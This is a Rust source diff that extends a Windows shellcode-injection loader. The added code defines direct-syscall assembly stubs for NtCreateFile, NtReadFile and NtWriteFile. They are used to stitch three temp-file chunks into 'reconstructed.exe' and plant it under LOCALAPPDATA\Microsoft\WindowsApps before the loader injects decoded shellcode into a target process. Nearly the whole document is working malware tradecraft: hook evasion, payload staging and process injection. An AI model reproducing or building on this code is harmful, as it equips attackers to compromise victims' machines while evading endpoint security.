@@ -10,6 +10,9 @@ use windows_sys::Win32::System::Threading::{PROCESS_ALL_ACCESS, PROCESS_BASIC_IN
 use windows_sys::Win32::System::WindowsProgramming::{CLIENT_ID, OBJECT_ATTRIBUTES};
 use windows_sys::Win32::System::Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE};
 use windows_sys::Win32::Foundation::{HANDLE, NTSTATUS};
+use windows_sys::Win32::Storage::FileSystem::{
+    FILE_GENERIC_READ, FILE_GENERIC_WRITE, FILE_SHARE_READ, FILE_OPEN, FILE_OVERWRITE_IF,
+};
 use windows_sys::Win32::System::SystemServices::{IMAGE_DOS_HEADER};
 use windows_sys::Win32::System::Diagnostics::Debug::{IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER};
 use base64::{Engine as _, engine::general_purpose};
@@ -72,7 +75,50 @@ asm_nt_query_information_process:
     mov eax, [rsp + 0x30]
     syscall
     ret
+
+.global asm_nt_create_file
+asm_nt_create_file:
+    mov r10, rcx
+    mov eax, [rsp + 0x60]
+    syscall
+    ret
+
+.global asm_nt_read_file
+asm_nt_read_file:
+    mov r10, rcx
+    mov eax, [rsp + 0x50]
+    syscall
+    ret
+
+.global asm_nt_write_file
+asm_nt_write_file:
+    mov r10, rcx
+    mov eax, [rsp + 0x50]
+    syscall
+    ret
 "#);
+
+#[repr(C)]
+#[allow(non_snake_case)]
+pub struct IO_STATUS_BLOCK {
+    pub Anonymous: IO_STATUS_BLOCK_0,
+    pub Information: usize,
+}
+
+#[repr(C)]
+#[allow(non_snake_case)]
+pub union IO_STATUS_BLOCK_0 {
+    pub Status: NTSTATUS,
+    pub Pointer: *mut std::ffi::c_void,
+}
+
+#[repr(C)]
+#[allow(non_snake_case)]
+pub struct UNICODE_STRING {
+    pub Length: u16,
+    pub MaximumLength: u16,
+    pub Buffer: *mut u16,
+}
 
 extern "C" {
     fn asm_nt_open_process(ProcessHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, ClientId: &mut CLIENT_ID, syscall_id: u32) -> NTSTATUS;
@@ -83,6 +129,126 @@ extern "C" {
     fn asm_nt_protect_virtual_memory(ProcessHandle: HANDLE, BaseAddress: &mut *mut std::ffi::c_void, NumberOfBytesToProtect: &mut usize, NewProperty: u32, OldProperty: &mut u32, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_read_virtual_memory(ProcessHandle: HANDLE, BaseAddress: *const std::ffi::c_void, Buffer: *mut std::ffi::c_void, NumberOfBytesToRead: usize, NumberOfBytesRead: &mut usize, syscall_id: u32) -> NTSTATUS;
     fn asm_nt_query_information_process(ProcessHandle: HANDLE, ProcessInformationClass: u32, ProcessInformation: *mut std::ffi::c_void, ProcessInformationLength: u32, ReturnLength: &mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_create_file(FileHandle: &mut HANDLE, DesiredAccess: u32, ObjectAttributes: &mut OBJECT_ATTRIBUTES, IoStatusBlock: &mut IO_STATUS_BLOCK, AllocationSize: *mut i64, FileAttributes: u32, ShareAccess: u32, CreateDisposition: u32, CreateOptions: u32, EaBuffer: *mut std::ffi::c_void, EaLength: u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_read_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *mut std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
+    fn asm_nt_write_file(FileHandle: HANDLE, Event: HANDLE, ApcRoutine: *mut std::ffi::c_void, ApcContext: *mut std::ffi::c_void, IoStatusBlock: &mut IO_STATUS_BLOCK, Buffer: *const std::ffi::c_void, Length: u32, ByteOffset: *mut i64, Key: *mut u32, syscall_id: u32) -> NTSTATUS;
+}
+
+fn merge_and_copy_payload() {
+    let temp_dir = std::env::var("TEMP").unwrap_or_else(|_| "C:\\Windows\\Temp".to_string());
+    let local_app_data = std::env::var("LOCALAPPDATA").unwrap_or_default();
+
+    if local_app_data.is_empty() { return; }
+
+    let files = [
+        format!("{}\\{}", temp_dir, "1.tmp"),
+        format!("{}\\{}", temp_dir, "2.tmp"),
+        format!("{}\\{}", temp_dir, "3.tmp"),
+    ];
+    let reconstructed = format!("{}\\{}", temp_dir, "reconstructed.exe");
+    let destination = format!("{}\\Microsoft\\WindowsApps\\reconstructed.exe", local_app_data);
+
+    let nt_create_file_id = syscall::get_syscall_number("NtCreateFile").unwrap();
+    let nt_read_file_id = syscall::get_syscall_number("NtReadFile").unwrap();
+    let nt_write_file_id = syscall::get_syscall_number("NtWriteFile").unwrap();
+    let nt_close_id = syscall::get_syscall_number("NtClose").unwrap();
+
+    unsafe {
+        let mut h_out = 0;
+        if nt_open_create_file(&mut h_out, &reconstructed, FILE_GENERIC_WRITE, FILE_OVERWRITE_IF, nt_create_file_id) {
+            for f in &files {
+                let mut h_in = 0;
+                if nt_open_create_file(&mut h_in, f, FILE_GENERIC_READ, FILE_OPEN, nt_create_file_id) {
+                    copy_data(h_in, h_out, nt_read_file_id, nt_write_file_id);
+                    asm_nt_close(h_in, nt_close_id);
+                }
+            }
+            asm_nt_close(h_out, nt_close_id);
+        }
+
+        let mut h_src = 0;
+        let mut h_dst = 0;
+        if nt_open_create_file(&mut h_src, &reconstructed, FILE_GENERIC_READ, FILE_OPEN, nt_create_file_id) {
+            if nt_open_create_file(&mut h_dst, &destination, FILE_GENERIC_WRITE, FILE_OVERWRITE_IF, nt_create_file_id) {
+                copy_data(h_src, h_dst, nt_read_file_id, nt_write_file_id);
+                asm_nt_close(h_dst, nt_close_id);
+            }
+            asm_nt_close(h_src, nt_close_id);
+        }
+    }
+}
+
+unsafe fn nt_open_create_file(handle: &mut HANDLE, path: &str, access: u32, disposition: u32, syscall_id: u32) -> bool {
+    let mut nt_path: Vec<u16> = "\\??\\".encode_utf16().collect();
+    nt_path.extend(path.encode_utf16());
+    nt_path.push(0);
+
+    let mut us = UNICODE_STRING {
+        Length: ((nt_path.len() - 1) * 2) as u16,
+        MaximumLength: (nt_path.len() * 2) as u16,
+        Buffer: nt_path.as_mut_ptr(),
+    };
+
+    let mut obj_attr: OBJECT_ATTRIBUTES = mem::zeroed();
+    obj_attr.Length = mem::size_of::<OBJECT_ATTRIBUTES>() as u32;
+    obj_attr.ObjectName = &mut us as *mut _ as *mut _;
+    obj_attr.Attributes = 0x00000040; // OBJ_CASE_INSENSITIVE
+
+    let mut io_status: IO_STATUS_BLOCK = mem::zeroed();
+
+    let status = asm_nt_create_file(
+        handle,
+        access | 0x00100000, // SYNCHRONIZE
+        &mut obj_attr,
+        &mut io_status,
+        std::ptr::null_mut(),
+        0,
+        FILE_SHARE_READ,
+        disposition,
+        0x00000020 | 0x00000040, // FILE_SYNCHRONOUS_IO_NONALERT | FILE_NON_DIRECTORY_FILE
+        std::ptr::null_mut(),
+        0,
+        syscall_id,
+    );
+
+    status == 0
+}
+
+unsafe fn copy_data(h_in: HANDLE, h_out: HANDLE, read_id: u32, write_id: u32) {
+    let mut buffer = [0u8; 8192];
+    loop {
+        let mut io_status_read: IO_STATUS_BLOCK = mem::zeroed();
+        let status = asm_nt_read_file(
+            h_in,
+            0,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            &mut io_status_read,
+            buffer.as_mut_ptr() as *mut _,
+            buffer.len() as u32,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            read_id,
+        );
+
+        if status != 0 || io_status_read.Information == 0 {
+            break;
+        }
+
+        let mut io_status_write: IO_STATUS_BLOCK = mem::zeroed();
+        asm_nt_write_file(
+            h_out,
+            0,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            &mut io_status_write,
+            buffer.as_ptr() as *const _,
+            io_status_read.Information as u32,
+            std::ptr::null_mut(),
+            std::ptr::null_mut(),
+            write_id,
+        );
+    }
 }
 
 const SHELLCODE: &str = "Shellcode_replace";
@@ -292,6 +458,8 @@ fn get_process_pid() -> Option<u32> {
 }
 
 fn main() {
+    merge_and_copy_payload();
+
     let target_pid = get_process_pid().expect("Process not found");
     let shellcode = general_purpose::STANDARD.decode(SHELLCODE).expect("Invalid shellcode");
 
